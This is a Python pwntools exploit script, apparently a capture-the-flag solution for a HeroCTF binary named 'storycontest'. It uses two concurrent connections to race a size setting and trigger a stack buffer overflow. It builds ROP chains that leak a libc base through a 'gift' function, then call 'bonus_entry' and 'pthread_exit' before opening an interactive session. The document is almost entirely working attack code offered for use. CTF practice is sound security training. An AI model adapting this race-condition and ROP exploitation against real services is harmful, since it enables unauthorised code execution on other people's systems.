from pwn import *
import time

elf = ELF("./storycontest_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

context.binary = elf
endpoint = "dyn10.heroctf.fr"
port = 11024
# endpoint = "localhost"
# port = 5555
p1 = remote(endpoint, port)
p2 = remote(endpoint, port)
# p1 = remote("localhost", 5555)
# p2 = remote("localhost", 5555)

p1.sendlineafter(b'> ', b'1')
p2.sendlineafter(b'> ', b'1')

p1.sendlineafter(b': ', b'10')
time.sleep(0.1)
p2.sendlineafter(b': ', b'1000')

p1.sendlineafter(b':\n', b'a' * 168 + pack(0x000000000040101a) + pack(elf.symbols['gift']))

p2.sendlineafter(B'> ', b'3')
p2.recvuntil(b'gift: ')
libc_base = int(p2.recvline(), 16) - libc.symbols['_IO_2_1_stdout_']

print(hex(libc_base))
print(hex(libc_base + 0x000000000010f78b))
pause()
context.log_level = 'debug'
p1 = remote(endpoint, port)
p1.sendlineafter(b'> ', b'1')
p2.sendlineafter(b'> ', b'1')

p1.sendlineafter(b': ', b'10')
time.sleep(0.1)
p2.sendlineafter(b': ', b'1000')

p1.sendlineafter(b':\n', b'a' * 168 + pack(libc_base + 0x000000000010f78b) + pack(0x1337c0de) + pack(elf.symbols['bonus_entry']) + pack(libc_base + 0x000000000010f78b) + pack(0) + pack(elf.symbols['pthread_exit']))

p2.interactive()